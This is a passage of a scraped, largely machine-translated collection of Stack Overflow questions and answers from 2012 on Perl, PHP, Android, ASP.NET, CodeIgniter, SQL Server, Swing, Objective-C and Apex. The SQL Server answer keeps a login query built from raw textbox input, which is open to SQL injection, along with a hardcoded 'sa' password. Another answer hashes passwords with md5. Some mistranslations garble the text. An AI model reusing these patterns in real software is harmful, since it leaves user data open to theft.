您可以使用 HTML 设计页面布局并在顶部添加 GWT 小部件。

HTML：创建一个`div`并`id="treeStr2"`使用 css

总重量：`RootPanel.get("treeStr2").add(your widget);`

# perl - login and logout of sessions in 2 cgi scripts

> ID：10991156
> 
> 赞同：3
> 
> 时间：2012-06-12T05:50:06.603
> 
> 标签：perl, session, login, cgi, logout

I need to store a login session when the user is login and remove the login session when the user has logged out of the system or the session has timeout. I am coding in Perl. I know I can use CGI::Session module in Perl but how do I make sure that the session is created by 1 cgi script and removed by another cgi script. Then all other pages of the system has to check if the session exist before it can display its contents.

Currently, I am using the following code to create a new session when the user has login successfully.

```
my $session = CGI::Session->new();
my $CGISESSID = $session->id(); 
```

However, how do I log the user out of the session in another cgi script? I doubt I can just use the following since the $session is not defined in the other cgi script

```
$session->delete();
$session->flush(); 
```

Any ideas?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:39:41.400

默认情况下，CGI::Sessions 独立于脚本。所以你应该能够做到这一点。

只是不要忘记以某种方式在客户端上保留会话 ID。它可以通过 cookie 来完成，[`header()`](http://search.cpan.org/~markstos/CGI-Session-4.48/lib/CGI/Session.pm#header%28%29)例如参见 session。ID 和会话对象将被自动检索（如果保存正确）。

看[`CGI::Session new()`](http://search.cpan.org/~markstos/CGI-Session-4.48/lib/CGI/Session.pm#new%28%29)

> 如果不带任何参数调用，$dsn 默认为 driver:file;serializer:default;id:md5

和[`CGI::Session::Driver::file`](http://search.cpan.org/~markstos/CGI-Session-4.48/lib/CGI/Session/Driver/file.pm)。

您可以将它们配置为使用您喜欢的商店和设置。

* * *

使用会话的基本**示例CGI 脚本：**

```
#!/usr/bin/perl
use strict;
use warnings;

use CGI;
use CGI::Carp qw(fatalsToBrowser); # show errors in browser
use CGI::Session;

# new query object
my $q = CGI->new();

# new session object, will get session ID from the query object
# will restore any existing session with the session ID in the query object
my $s = CGI::Session->new($q);

# print the HTTP header and set the session ID cookie
print $s->header();

# print some info

print "<pre>\n";

print "Hello!\n\n";
printf "Your session ID is: %s\n", $s->id;
printf "This sessin is: %s\n", $s->is_new ? 'NEW': 'old';
printf "Stored session 'test' value: '%s'\n", $q->escapeHTML($s->param('test'));
printf "CGI Params: %s\n", join ', ', $q->param;

# handle the form submit

if(defined $q->param('save')){
    # save param value in the session
    $s->param('test', $q->param('test'));
    printf "Set session value: '%s'\n", $q->escapeHTML($s->param('test'));
}
elsif(defined $q->param('delete')){
    # delete session
    $s->delete;
    print "Session will be deleted.\n";
}

print "\n</pre>\n";

# simple HTML form

printf <<'_HTML_', $q->escapeHTML($s->param('test'));
<hr/>
<form>
Session value "test": <input type="text" value="%s" name="test"/>
<button type="submit" name="save">Save Value</button>
<button type="submit" name="delete">Delete session</button>
</form>
_HTML_

# eof (linebreak needed after _HTML_) 
```

# php - Open window, navigate through it

> ID：10991157
> 
> 赞同：0
> 
> 时间：2012-06-12T05:50:15.370
> 
> 标签：php

I know this is possible in Perl, but I was wondering if this can be done in PHP.

What I want to do is open a browser with a window, click to a link in that page, or navigate in the browser, then it has a simple textbox called test, and I want to put text in that box then click submit and all done in PHP. I know jQuery and Javascript so I am fine if part of this little project should be done in any of those two. I did some research on it and couldn't find a clear approach to this.

I don't need written code provided for me, I just need an answer with suggestions and if possible, little codes to do some tricks.

Thanks in advance.

-G

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T05:55:08.800

PHP 是一种服务器端语言，因此一切都在服务器上完成，并将结果发送回用户以在浏览器中显示。你不能在 PHP 中做这样的事情。您最好的选择是使用 javascript 单击页面上的链接并提交表单......但是请解释一下这是为了什么，以便我们可以提供一种方法来做到这一点？

要在 Javascript 中执行此操作，您可以使用 jQuery[`.click()`](http://api.jquery.com/click/)单击链接并[`.submit()`](http://api.jquery.com/submit/)提交表单。由于表单在第二页，提交代码也必须在该页面上。如果您真的想自动执行此操作，您可以在 iFrame 中加载第一页并使用其中的内容，但两个页面（父页面和 iframe）必须位于同一域中。为了绕过这一点，我会编写一个 Chrome 扩展程序，在这些页面中使用我的 JS（点击/提交内容）插入一个小内容脚本。

在 PHP 中，您可以下载第一个页面，解析您想要从中单击的链接，然后下载该页面，找出其中的表单，然后他们使用 cURL 提交该表单。您也可以使用 cURL 下载页面。这是一个关于如何[使用 php 获取远程文件内容的](http://www.php-mysql-tutorial.com/wikis/php-tutorial/reading-a-remote-file-using-php.aspx)教程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:07:12.797

PHP 有一个名为的扩展`cURL`，它能够从 PHP 下载 Web 并访问它或将其保存到磁盘。

要在表单中填写字段，您可能事先知道字段名称和表单操作，并在 cURL 发出的请求中对其进行编码。

文档在[这里](http://php.net/manual/en/book.curl.php)。

希望有帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:00:49.077

您可以使用 curl 在 PHP 中复制表单帖子。这里本身为文本框提供值。php中的导航窗口是我不确定的。

# android - 通知中的进度条

> ID：10991159
> 
> 赞同：0
> 
> 时间：2012-06-12T05:50:43.527
> 
> 标签：android, progress-bar, notificationmanager

我尝试将进度条放入通知中。但问题是系统启动后几秒钟无响应，进度条卡在开始，请注意即使进度条卡住了，但文件仍在下载中。

下面是代码，请指导我如何处理进度条。

```
public class StaffChoice extends Activity {
    public static final int DIALOG_DOWNLOAD_PROGRESS = 0;

    ProgressBar progressBar;
    private int progress = 10;

    Intent MyI;
    PendingIntent MyPI;
    NotificationManager MyNM;
    Notification notification;
    NotificationManager notificationManager;

    private void startDownload() {
        String url = "http://www.domainurl.com/3d.png";     //this is not a valid url
        DownloadFileAsync dfa = new DownloadFileAsync();
        dfa.setActivity(StaffChoice.this);
        dfa.execute(url);
        }

       public void onTaskCompleted() {
           dismissDialog(DIALOG_DOWNLOAD_PROGRESS);
       }

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.staffchoices);

        MyI = new Intent(getApplicationContext(), MaxAppsAct.class);
        MyPI = PendingIntent.getActivity(getApplicationContext(), 0, MyI, 0);
        MyNM = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);

        Intent intent = new Intent(this, StaffChoice.class);
        final PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);

        notification = new Notification(R.drawable.logo, "Downloading...", System.currentTimeMillis());
        notification.flags = notification.flags | Notification.FLAG_ONGOING_EVENT;
        notification.contentView = new RemoteViews(getApplicationContext().getPackageName(), R.layout.staffchoices);
        notification.contentIntent = pendingIntent;
        notification.contentView.setImageViewResource(R.id.imgIcon, R.drawable.save);
        notification.contentView.setTextViewText(R.id.tvText, "Downloading...");
        notification.contentView.setProgressBar(R.id.pbStatus, 100, progress, false);

        notificationManager = (NotificationManager) getApplicationContext().getSystemService(getApplicationContext().NOTIFICATION_SERVICE);

        notificationManager.notify(42, notification);        
        startDownload();
        }

    public class DownloadFileAsync extends AsyncTask<String, String, String> {
        StaffChoice activity;
        private boolean completed;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            showDialog(DIALOG_DOWNLOAD_PROGRESS);
            }

        @Override
        protected String doInBackground(String... aurl) {
        int count;
        try {
            URL url = new URL(aurl[0]);
            URLConnection conexion = url.openConnection();
            conexion.connect();

            int lenghtOfFile = conexion.getContentLength();
            Log.d("ANDRO_ASYNC", "Lenght of file: " + lenghtOfFile);
            File folder = new File(Environment.getExternalStorageDirectory() + "/MaxApps");
            boolean success = false;
            if (!folder.exists()) {
                success = folder.mkdirs();
                }
            if (!success) {

            } else {

            }

            InputStream input = new BufferedInputStream(url.openStream());
            OutputStream output = new FileOutputStream("/sdcard/MaxApps/3d.png");

            byte data[] = new byte[1024];
            long total = 0;

            while ((count = input.read(data)) != -1) {
            total += count;
            publishProgress(""+(int)((total*100)/lenghtOfFile));
            output.write(data, 0, count);
            }

            output.flush();
            output.close();
            input.close();
            } catch (Exception e) {}
        return null;
        }

        protected void onProgressUpdate(Integer... progress) {
            notification.contentView.setProgressBar(R.id.pbStatus, 100, progress[0], false);
            notificationManager.notify(42, notification);
            }

        @Override
        protected void onPostExecute(String unused) {
            completed = true;
            notifyActivityTaskCompleted();
            }

        public void setActivity(StaffChoice activity){
            this.activity = activity;
            if (completed) {
                notifyActivityTaskCompleted();
                }
            }

        private void notifyActivityTaskCompleted() {
            if (null != activity) {
                activity.onTaskCompleted();
                }
            }
        }
    } 
```

![日志猫：](../Images/b74fcf843edff395a6bc54a7228c0d1c.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:00:40.967

我建议您不要在线程中使用 AsyncTask。

要显示通知，请在 AysnTask 中添加以下代码：

```
 @Override
 protected void onProgressUpdate(Integer... progress) {
     notification.contentView.setProgressBar(R.id.pbStatus, 100, progress[0], false);
     notificationManager.notify(42, notification);
 } 
```

**更新**：logcat 中的错误如下所示（关闭对话框导致错误）： [http ://blog.doityourselfandroid.com/2010/11/14/handling-progress-dialogs-and-screen-orientation-changes/](http://blog.doityourselfandroid.com/2010/11/14/handling-progress-dialogs-and-screen-orientation-changes/)

你可以试试这个：

```
class YourActivity extends Activity {

private void startDownload() {
String url = "http://www.domainurl.com/3d.png";
DownloadFileAsync dfa = new DownloadFileAsync();
dfa.setActivity(YourActivity.this);
dfa.execute(url);
 }

   public void onTaskCompleted() {
dismissDialog(DIALOG_DOWNLOAD_PROGRESS);
   }

   public void dismissDialog(int id){
    //...
   }

   public void showDialog(int id){
    //...
   }

public class DownloadFileAsync extends AsyncTask<String, String, String> {

YourActivity activity;
    private boolean completed;

@Override
protected void onPreExecute() {
    super.onPreExecute();
    activity.showDialog(DIALOG_DOWNLOAD_PROGRESS);
}

@Override
protected String doInBackground(String... aurl) {
    // nothing change
}

protected void onProgressUpdate(Integer... progress) {
    notification.contentView.setProgressBar(R.id.pbStatus, 100, progress[0], false);
    notificationManager.notify(42, notification);
}

@Override
protected void onPostExecute(String unused) {
        completed = true;
        notifyActivityTaskCompleted();

}
}

public void setActivity(YourActivity activity){
           this.activity = activity;
           if ( completed ) {
            notifyActivityTaskCompleted();
           }

private void notifyActivityTaskCompleted() {
if (null != activity) {
    activity.onTaskCompleted();
}

}
} 
```

当您在 doInBackground 中*使用**publishProgress*时，它应该将进度更新为通知

# asp.net - ASP.NET: Loop through database

> ID：10991161
> 
> 赞同：0
> 
> 时间：2012-06-12T05:50:57.897
> 
> 标签：asp.net, database, loops

I have a page right now that functions 100%, it updates a database , based on an id sent via querystring. Now, I am wanting to make this function perform for EVERY row in the database and without being sent a querystring.

```
 Dim amzRepeater As DataRowView = e.Item.DataItem

    Dim myId As String = Request.QueryString("Id")
    Dim amzUrl As String = amzRepeater.Row("AmazonUrl")
    amazonURL.Value = amzUrl

    '''''''''''''''''''''''''''''''''''''''''''''''''''''''

    Dim aHtml As New HtmlWeb
    Dim aDoc As HtmlDocument = aHtml.Load(amazonURL.Value)

    Dim aNode As HtmlAgilityPack.HtmlNode
    aNode = aDoc.DocumentNode.SelectSingleNode("//div[@id='olpDivId']/span[2]")
    Dim UsedPrice As String = aNode.InnerText
    Dim i As Integer = UsedPrice.IndexOf("$")
    UsedPrice = UsedPrice.Substring(i + 1)

    Dim connStr As String = ConfigurationManager.ConnectionStrings("arprimaryConnectionString").ConnectionString
    Dim con As New SqlConnection(connStr)
    Dim cmd As New SqlCommand("UPDATE Amazon SET AmazonUsedPrice = @AmazonUsedPrice, LastUpdated = @LastUpdated WHERE (id = @id)", con)
    cmd.Parameters.AddWithValue("@AmazonUsedPrice", UsedPrice)
    cmd.Parameters.AddWithValue("@LastUpdated", DateTime.Now.ToString)
    cmd.Parameters.AddWithValue("@Id", myId)

    Using con
        con.Open()
        cmd.ExecuteNonQuery()
    End Using

    MsgBox("Update Sucesfull.") 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T05:54:44.633

您应该能够从 SQL 语句中删除*WHERE子句和**id*参数。这将更新每一行：

```
Dim cmd As New SqlCommand("UPDATE Amazon SET AmazonUsedPrice = @AmazonUsedPrice, LastUpdated = @LastUpdated", con)
cmd.Parameters.AddWithValue("@AmazonUsedPrice", UsedPrice)
cmd.Parameters.AddWithValue("@LastUpdated", DateTime.Now.ToString) 
```

# pdf - How to embed PDF in Web Page, which looks like HTML Form?

> ID：10991162
> 
> 赞同：0
> 
> 时间：2012-06-12T05:50:58.153
> 
> 标签：pdf, embed

How to **embed PDF** in **Web Page**, which looks like **HTML Form**?

# php - 如何从 $_POST 数组中删除元素？

> ID：10991163
> 
> 赞同：3
> 
> 时间：2012-06-12T05:51:14.573
> 
> 标签：php, html, post, xhtml

我想从公式中将一条记录插入到 MySQL 数据库表中。问题是变量`field`中的表列中没有 a ，但它在. 我通过这种方式插入字段值：`$_POST``textfield``formulaire`

```
$newRecord->insert($_POST); // we created a generic function insert($array) to insert records 
```

那么如何删除 $_POST 的元素呢？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-06-12T05:52:21.887

简单地去：

```
unset($_POST['field']); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:01:39.517

如果`$_POST`包含用户输入的数据，那么我真的希望该`insert`功能正在清理数据。如果不是，您只是要求进行 SQL 注入攻击。

# codeigniter - 文件上传路径到codeigniter中的数据库

> ID：10991167
> 
> 赞同：-1
> 
> 时间：2012-06-12T05:51:42.547
> 
> 标签：codeigniter

大家好，
我正在尝试上传数据库中的文件路径，但它正在重定向相同的文件，并且文件没有上传，任何人都可以帮助我.. 这是我的控制器。

```
<?php
if (!defined ('BASEPATH'))exit('no direct scripts allowed ');
class Main extends CI_Controller
{
    function __construct ()
    {
        parent::__construct();
        $this->load->library('session');
    }

    function insert_quiz_data()
   {

    $this->load->library('form_validation'); //loading validation library

    $this->form_validation->set_rules('qtitle','quiz_title'); //setting rules for validation
    $this->form_validation->set_rules('qcategory1','quiz_category1');
    $this->form_validation->set_rules('qcategory2','quiz_category2');
    $this->form_validation->set_rules('qcategory3','quiz_category3');
    $this->form_validation->set_rules('astatus','email');

    $this->form_validation->set_rules('userfile', 'quiz_image_path', 'callback__do_upload'); //userfile is the upload file field name in form ,
    echo 'testing';

    if($this->form_validation->run()!=false)
    {

        //Get the info from the form
        $username   =   $this->input->post('qtitle');
        $password   =   $this->input->post('qcategory1');
        $passconf   =   $this->input->post('qcategory2');
        $date       =   $this->input->post('qcategory3');
        $email      =   $this->input->post('astatus');

        $temp=$this->upload->data();
        $image=$temp['file_name'];// to get image file name rom upload script , as it could be stored in the databae

        //load the model
        $this->load->model('quiz_mode');

        //execute the registration query
        $data = $this->quiz_mode->register_user($username,$password,$passconf,$date,$image,$email);

        //if $data == TRUE
        if($data)
        {
            echo "you have successfully made your registration";
             $this->load->view('logged_in_area');
        }
        else
        {
            echo "faillled";
        }
    }
    else{

        //You arrived here just in case the form fields are not correct
         $this->load->view('logged_in_area'); //loading reg form here
    }
}
    public function _do_upload()
    {
        $config['upload_path'] = './uploads/';
        $config['allowed_types'] = 'gif|jpg|png';
        $config['max_size'] = '100';
        $config['max_width']  = '1024';
        $config['max_height']  = '768';
        $field_name = 'userfile';
        $this->load->library('upload', $config);
        if ( ! $this->upload->do_upload($field_name))
        {
              $this->form_validation->set_message('_do_upload', $this->upload->display_errors());
              return FALSE;
        }
        else
        {
            $image_data = $this->upload->data();
            $filename = $image_data['file_name'];
            $config = array
            (
              'source_image' => $image_data['full_path'],
              'new_image' => './uploads/thumbs/',
              'maintain_ratio' => false,
              'width' => 300,
              'height' => 200
            );
            $this->load->library('image_lib', $config);
            $this->image_lib->resize();
            return TRUE;
        }
    }
} 
```

我的模特班：

```
<?php
class File_model extends CI_Model
{
    function File_model()
    {
        parent::__construct();
    }
    function register_user($username,$password,$passconf,$date,$image,$email)
    {

          $data= array('username'=>$username,
        'password'=>$password,
        'passconf'=>$passconf,
        'date'=>$date,
        'image'=>$image,
        'email'=>$email
        );
       $res= $this->db->insert('register', $data); //register is my table name
        return $res;
        var_dump($res);
    }

}
?> 
```

我的观点

```
<html>
<body>

<?php $this->load->helper('form'); ?>
<?php echo form_open_multipart('index.php/main'); ?>
<?php echo validation_errors(); ?>

<table width="348" align="center" cellpadding="0" cellspacing="0">
    <tr>
      <td colspan="2" align="center"><h2><strong>REGISTERATION AREA</strong></h2></td>
  </tr>
    <tr><?php  //echo validation_errors(); ?>
      <td width="97" height="40"><label for"username"> <strong>Username </strong></label></td>
      <td width="249"><input type="text" id="username" name="username" value="<?php echo set_value('username'); ?>"/></td>
    </tr>
    <tr>
      <td><label for"password"> <strong>Password </strong></label></td>
      <td><input type="password" name="password" id="password" value="<?php echo set_value('password'); ?>"/></td>
    </tr>
    <tr>
      <td><label for"confirm password"> <strong>Passconf</strong></label></td>
      <td><input type="password" name="passconf" id="passconf" value="<?php echo set_value('passconf'); ?>"/></td>
    </tr>
    <tr>
      <td><label for"date "><strong>Date</strong></label></td>
      <td><input type="text" name="datepicker" id="datepicker" /></td>
    </tr>
    <tr>
      <td><strong>Upload Picture</strong></td>
      <td><input type="file" name="userfile" size="20" id="userfile" /></td>
    </tr>
    <tr>
      <td><label for"email"> <strong>Email</strong></label></td>
      <td><input type="text" name="email" value="<?php echo set_value('email'); ?>"/></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td height="44">&nbsp;</td>
      <td align="center">
      <input type="submit" id="submit" value="Register" /></td>
    </tr>
</table>

</body>
</html> 
```

谁能帮我 。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T10:03:58.733

在您的`_do_upload`函数中，您没有在函数中传递参数，它不能使用`$field_name` 尝试更改它：

```
public function _do_upload($field_name) 
```

您的代码存在不同的问题。首先，您在验证之前加载视图，这样视图总是显示出来的。试试我下面的代码（只是索引函数）：

```
function index()
{

    $this->load->library('form_validation'); //loading validation library

    $this->form_validation->set_rules('username','username','Rquired'); //setting rules for validation
    $this->form_validation->set_rules('password','password','required|md5|trim');
    $this->form_validation->set_rules('passconf','password confirmation','required|md5|trim');
    $this->form_validation->set_rules('datepicker','date','required');
    $this->form_validation->set_rules('email','email','required');

    $this->form_validation->set_rules('userfile', 'Image', 'callback__do_upload'); //userfile is the upload file field name in form ,

    if($this->form_validation->run()!=false)
    {

        //Get the info from the form
        $username   =   $this->input->post('username');
        $password   =   $this->input->post('password');
        $passconf   =   $this->input->post('passconf');
        $date       =   $this->input->post('datepicker');
        $email      =   $this->input->post('email');

        $temp=$this->upload->data();
        $image=$temp['file_name'];// to get image file name rom upload script , as it could be stored in the databae

        //load the model
        $this->load->model('file_model');

        //execute the registration query
        $data = $this->file_model->register_user($username,$password,$passconf,$date,$image,$email);

        //if $data == TRUE
        if($data)
        {               
            echo "you have successfully made your registration";
        }
        else
        {
            echo "faillled";
        }
    }
    else{
        //You arrived here just in case the form fields are not correct
         $this->load->view('register_form'); //loading reg form here
    }

} 
```

# sql-server - sql语句中的错误where子句靠近密码

> ID：10991174
> 
> 赞同：-1
> 
> 时间：2012-06-12T05:52:50.890
> 
> 标签：sql-server

我在 sql 语句中遇到错误。

> ("服务器 = RAJ-PC\SQLEXPRESS; 用户 id=sa; 密码=as64ws; 数据库=onlineshopping", "select * from customer where userid='" + TextBox1.Text + "', password='" + TextBox2.Text + "'");

我写了这个语句来连接到 SQL Server。密码附近的 SQL 语句中显示错误。我的错误是什么？？？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T05:55:53.470

多个 where 子句使用 AND 而不是`,`.

```
("server= RAJ-PC\SQLEXPRESS; user id=sa; password=as64ws; database=onlineshopping", "select * from customer where userid='" + TextBox1.Text + "' AND password='" + TextBox2.Text + "'"); 
```

# java - 激活 Java Swing 工具提示时会发生什么？

> ID：10991175
> 
> 赞同：1
> 
> 时间：2012-06-12T05:52:53.993
> 
> 标签：java, swing, search, tooltip, jtextfield

我在 Java Swing 中创建了一个动态搜索字段。我有一个 JTextField，您可以在其中输入要搜索的内容，还有一个 JScrollPane 内的 JList，其中包含您输入的匹配项。当您在 JTextField 中写入时，它控制 JScrollPane：它的内容，以及它是否应该可见。

当我使用它创建示例窗口时它工作正常，但在我的大 GUI 中却不行。我无法解释 GUI，所以我不希望你完全解决这个问题，但也许可以回答一个关于它的问题。

问题是，当 JTextField 为空或我们没有找到匹配项时，列表被隐藏（setVisible(false)）。当您开始输入并找到至少一项时，它会显示 (setVisible(true))。当我启动我的 GUI 并开始在搜索字段中输入内容时，列表没有按应有的方式显示。它根本不会出现。我已经调试了代码，并且滚动窗格设置为可见 = true。根据运行代码可见，但看不到也无法与之交互。它没有隐藏在其他东西后面。

现在到了有趣的事情。如果我输入一些应该会产生点击的内容，然后将鼠标悬停在 JTextField 上，激活它的工具提示，JScrollBar 就会出现！之后，搜索字段正常运行，直到我关闭窗口。可见标志没有改变，但不知何故，它决定现在我们可以绘制它。

现在我想知道，显示工具提示时会发生什么？有没有什么特别的画正在发生，我可以称自己为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T05:55:45.077

您应该在调用`revalidate()`后调用包含滚动窗格和文本字段的组件`setVisible`。一般规则是，如果在容器布局并显示给用户*之后*`revalidate`更改容器组件的布局，则应该调用它。

让我知道这是否有帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:00:58.040

也许看看[AutoComplete JComboBox / JTextField](https://stackoverflow.com/a/7255918/714968)，因为 A`utoComplete JComboBox`不需要打扰`JToolTip`

# objective-c - 最佳实践访问器：@property @synthetise

> ID：10991178
> 
> 赞同：0
> 
> 时间：2012-06-12T05:53:10.003
> 
> 标签：objective-c, cocoa, properties, accessor

我在我的应用程序中使用以下代码：

```
@interface OMNController : NSObject
{
  IBOutlet NSSearchField *filterFieldMonitor;
  OMNMonitorTableView *monitorTableView;
}

@implementation OMNController
- (id) init
{
  monitorTableView = [[OMNMonitorTableView alloc] init];
  NSString *l_filter = [filterFieldMonitor stringValue];
  [monitorTableView setFilter:l_filter];
}
  ....
@end 
```

在此代码 1 示例中，无需使用 @property @synthesize 并且可以正常工作。

为了获得最佳实践，我是否必须使用 accessor / ivar ：

```
@interface OMNController : NSObject
{
  IBOutlet NSSearchField *_filterFieldMonitor;
  OMNMonitorTableView *_monitorTableView;
}
@property (readwrite, retain) OMNMonitorTableView *monitorTableView;
@property (assign) IBOutlet NSSearchField *filterFieldMonitor;;

@implementation OMNController

@synthesize monitorTableView = _monitorTableView;
@synthesize filterFieldMonitor = _filterFieldMonitor;

- (id) init
{
  self.monitorTableView = [[OMNMonitorTableView alloc] init];
  NSString *l_filter = [self.filterFieldMonitor stringValue];
  [self.monitorTableView setFilter:l_filter];
}
  ....
@end 
```

-

```
@interface OMNController : NSObject
{
  IBOutlet NSSearchField *filterFieldMonitor;
  OMNMonitorTableView *monitorTableView;
}
@property (readwrite, retain) OMNMonitorTableView *monitorTableView;
@property (assign) IBOutlet NSSearchField *filterFieldMonitor;;

@implementation OMNController

@synthesize monitorTableView;
@synthesize filterFieldMonitor;

- (id) init
{
  monitorTableView = [[OMNMonitorTableView alloc] init];
  NSString *l_filter = [filterFieldMonitor stringValue];
  [monitorTableView setFilter:l_filter];
}
  ....
@end 
```

什么是最好的方法，代码 1 或代码 2 或代码 3？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T09:39:05.310

首先，在 Cocoa 社区中，关于是否应该在 init/dealloc 中调用访问器存在相当大的争论。[在此处](https://stackoverflow.com/questions/1283419/valid-use-of-accessors-in-init-and-dealloc-methods)、[此处](https://stackoverflow.com/questions/5932677/initializing-a-property-dot-notation)和[此处](https://stackoverflow.com/questions/192721/why-shouldnt-i-use-objective-c-2-0-accessors-in-init-dealloc)查看相关问题。就个人而言，我属于“不要那样做”的阵营，但同样，这是值得商榷的。

其次，使用现代运行时，您根本不需要声明 ivars。只需声明您的属性，并完成它。ivars 是自动合成的。

第三，对于仅在内部使用的属性（不在定义它们的类之外），根本没有理由将它们放在头文件中。您可以在实现中将它们声明为类扩展。

最后，对于可能只创建一次的对象，我已经开始在访问器中懒惰地创建它们，而不是在 init 中显式创建它们。

鉴于这一切，我可能会这样写：

```
// OMNController.h
@interface OMNController : NSObject
@end

// OMNController.m
@interface OMNController ()
@property (nonatomic, retain) OMNMonitorTableView *monitorTableView;
@property (nonatomic, retain) IBOutlet NSSearchField *filterFieldMonitor;
@end

@implementation OMNController

@synthesize monitorTableView = _monitorTableView;
@synthesize filterFieldMonitor = _filterFieldMonitor;

- (OMNMonitorTableView*) monitorTableView 
{
    if( !_monitorTableView ) {
        _monitorTableView = [[OMNMonitorTableView alloc] init];
        NSString *l_filter = [self.filterFieldMonitor stringValue];
        [_monitorTableView setFilter:l_filter];
    }
    return _monitorTableView;
}

@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:26:16.807

作为“正确”面向对象设计的一部分，我总是被教导不应该直接访问对象的成员变量，而应该定义方法（或属性）来读取或操作这些变量。

如果这样，Objective-C 会花费一些精力（有趣吗？）。您使用`@property`and`@synthesize`这样您就不必显式声明您的属性并担心内存管理。[这个](https://stackoverflow.com/a/10799479/951830)答案更详细地解释了这种行为。

我还建议查看Apple Developer Library 上的[Declared Properties](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocProperties.html)

# apex-code - 顶点类的测试用例

> ID：10991179
> 
> 赞同：0
> 
> 时间：2012-06-12T05:53:12.780
> 
> 标签：apex-code

我`apex`为案例升级编写了一个批处理类。我想为它写一个测试类。有人可以帮帮我吗。下面是我写的代码：

```
global class CaseEscalation  implements  Database.Batchable<SObject> 

{

global CaseEscalation()

{

}  

 global Database.QueryLocator start(Database.BatchableContext  ctx)

 {

  System.debug('checking=======');

     return Database.getQueryLocator([SELECT  CaseNumber, CreatedDate,Status FROM Case             where (Status!='Closed' AND Status!='Escalated') and CreatedDate<TODAY ]); 

 }

 global void execute(Database.BatchableContext ctx, List<Sobject> scope)

 {

   List<Case> ca = (List<Case>)scope;

   System.debug('checking======='+ca);

   for(Case c : ca)

   {      

             System.Debug(c);
             String emailMessage = 'The case  ' + c.CaseNumber + ' has been ecalated ' + ' Please look into the case ' + 'Thankyou';

             Messaging.SingleEmailMessage mail  =   new Messaging.SingleEmailMessage();

             String[] toAddresses = new String[] {'reems.agarwal3@gmail.com'};

             mail.setToAddresses(toAddresses);

             mail.setSubject('Case Escalation');

             mail.setPlainTextBody(emailMessage);

             Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail });

             c.Status = 'Escalated';

    }

    if(ca.size()>0)

    update ca;

       }

global void finish(Database.BatchableContext ctx)

{

}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T19:01:38.970

您将无法以当前的方式轻松地使用代码测试您的批次。这是因为当您创建测试数据时，它将使用今天的创建日期创建，因此您的查询定位器不会返回任何记录，并且执行方法也不会运行。

我已经调整了你的批次以使其可行。

```
global class CaseEscalation implements Database.Batchable<SObject> {

    private static Date cutOff;

    global CaseEscalation(Date CutOffDate){
        cutOff = CutOffDate;
    }  

    global Database.QueryLocator start(Database.BatchableContext  ctx){
        return Database.getQueryLocator('SELECT Id, CaseNumber, CreatedDate, Status FROM Case WHERE (Status != \'Closed\' AND Status != \'Escalated\') and CreatedDate < :cutOff '); 
    }

    global void execute(Database.BatchableContext ctx, List<Sobject> scope){

        if(scope.size() == 0)
            return;

        for(Case c : (List<Case>)scope){      
            String emailMessage = 'The case  ' + c.CaseNumber + ' has been ecalated ' + ' Please look into the case ' + 'Thankyou';
            Messaging.SingleEmailMessage mail  =   new Messaging.SingleEmailMessage();
            String[] toAddresses = new String[] {'reems.agarwal3@gmail.com'};
            mail.setToAddresses(toAddresses);
            mail.setSubject('Case Escalation');
            mail.setPlainTextBody(emailMessage);
            Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail });

            c.Status = 'Escalated';
        }

        update scope;
    }

    global void finish(Database.BatchableContext ctx){

    }
} 
```

一旦你有了这个，你就可以编写一些测试来证明它可以运行。您需要注意，您一次不能从批处理执行方法中发送超过 10 封电子邮件，因此在执行批处理时，您必须确保将范围参数传递给执行方法。话虽如此，我很想在 execute 方法的循环中简单地构建电子邮件的正文，然后发送一封电子邮件，其中包含更新记录的所有详细信息 - 一封电子邮件，一个更干净的收件箱，并且没有担心达到州长限制。我没有这样做，因为我想让它尽可能接近您的原始代码。

然后，您可以编写一个如下所示的测试脚本来练习代码。

```
@isTest
private class CaseEscalationTest {

    private static testMethod void testInCutOff(){

        List<Case> testCases = new List<Case>();

        for(Integer i = 0; i < 10; i++)
            testCases.add(new Case(Status='Open'));

        insert testCases;

        Test.startTest();

        CaseEscalation ce = new CaseEscalation(system.today().addDays(1));
        database.executeBatch(ce, 10);

        Test.stopTest();

        testCases = [SELECT Id FROM Case WHERE Status = 'Open'];

        system.assertEquals(0, testCases.size());

    }

    private static testMethod void testOUtOfCutOff(){

        List<Case> testCases = new List<Case>();

        for(Integer i = 0; i < 10; i++)
            testCases.add(new Case(Status='Open'));

        insert testCases;

        Test.startTest();

        CaseEscalation ce = new CaseEscalation(system.today());
        database.executeBatch(ce, 10);

        Test.stopTest();

        testCases = [SELECT Id FROM Case WHERE Status = 'Open'];

        system.assertEquals(10, testCases.size());

    }

} 
```

